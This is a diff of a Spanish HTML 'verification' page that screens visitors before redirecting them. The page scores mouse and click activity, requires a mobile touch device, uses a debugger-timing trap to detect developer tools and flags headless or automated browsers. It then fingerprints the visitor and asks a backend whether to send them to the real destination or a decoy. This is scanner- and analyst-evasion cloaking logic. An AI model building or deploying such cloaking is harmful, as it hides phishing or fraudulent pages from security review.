@@ -2,90 +2,70 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Verificación humana...</title>
+  <title>Validando...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    html, body {
-      background: #fff;
-      margin: 0;
-      padding: 0;
-      height: 100vh;
-    }
-  </style>
+  <style>html, body {margin:0; height:100vh; background:#fff;}</style>
 </head>
 <body>
-
 <script>
-(function () {
-  const FINAL_REDIRECT = "https://tudestino-real.com";
-  const FAKE_REDIRECT = "https://bloqueado.com";
-  const WAIT_SECONDS = 3;
-  const MIN_TIME_BETWEEN_ENTRIES = 300000; // 5 minutos en ms
+(async function () {
+  const API_URL = "/verificar.php"; // Backend que decidirá redirección
+  const REDIR_OK = "https://tudestino-real.com";
+  const REDIR_BLOCK = "https://rechazado.com";
 
-  // Antibot simple - validaciones de interacción
-  let humanScore = 0;
-  let isHuman = false;
-  let lastVisit = localStorage.getItem("last_human_visit");
-  let now = Date.now();
+  let score = 0;
 
-  // Anti repetición rápida
-  if (lastVisit && now - parseInt(lastVisit) < MIN_TIME_BETWEEN_ENTRIES) {
-    window.location.href = FAKE_REDIRECT;
-    return;
+  function detectInteraction() {
+    const click = () => { score++; document.removeEventListener("click", click); };
+    const move = () => { score++; document.removeEventListener("mousemove", move); };
+    document.addEventListener("click", click);
+    document.addEventListener("mousemove", move);
   }
 
-  // Detección de interacción real (movimiento, clic, tiempo en página)
-  function registerMouseMove() {
-    humanScore += 1;
-    document.removeEventListener("mousemove", registerMouseMove);
-  }
-
-  function registerClick() {
-    humanScore += 1;
-    document.removeEventListener("click", registerClick);
-  }
-
-  function isMobileDevice() {
-    return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+  function isMobileReal() {
+    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) && navigator.maxTouchPoints > 0;
   }
 
   function detectDevTools() {
-    let threshold = 160;
-    let start = new Date();
-    debugger;
-    let end = new Date();
-    return end - start > threshold;
+    let start = new Date(); debugger; let end = new Date();
+    return end - start > 150;
   }
 
-  function isRealDevice() {
-    return isMobileDevice() && navigator.maxTouchPoints > 0;
+  function isHeadless() {
+    return navigator.webdriver || !window.chrome;
   }
 
-  // Eventos de interacción
-  document.addEventListener("mousemove", registerMouseMove);
-  document.addEventListener("click", registerClick);
+  function generateFingerprint() {
+    return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
+  }
 
-  // Esperar unos segundos y verificar
-  setTimeout(() => {
-    // Lógica de verificación múltiple
-    const touch = isRealDevice();
-    const devtools = detectDevTools();
-    const ipBlocked = false; // Requiere backend
-    const geoBlocked = false; // Requiere backend
+  detectInteraction();
 
-    if (touch && !devtools && !ipBlocked && !geoBlocked && humanScore >= 2) {
-      isHuman = true;
-    }
+  await new Promise(res => setTimeout(res, 3000)); // Esperar 3 segundos
 
-    if (isHuman) {
-      localStorage.setItem("last_human_visit", Date.now());
-      window.location.href = FINAL_REDIRECT;
-    } else {
-      window.location.href = FAKE_REDIRECT;
-    }
-  }, WAIT_SECONDS * 1000);
+  const fingerprint = generateFingerprint();
+  const payload = {
+    score,
+    mobile: isMobileReal(),
+    devtools: detectDevTools(),
+    headless: isHeadless(),
+    fingerprint
+  };
+
+  const res = await fetch(API_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+
+  const data = await res.json();
+
+  if (data && data.success) {
+    window.location.href = REDIR_OK;
+  } else {
+    window.location.href = REDIR_BLOCK;
+  }
 })();
 </script>
-
 </body>
 </html>
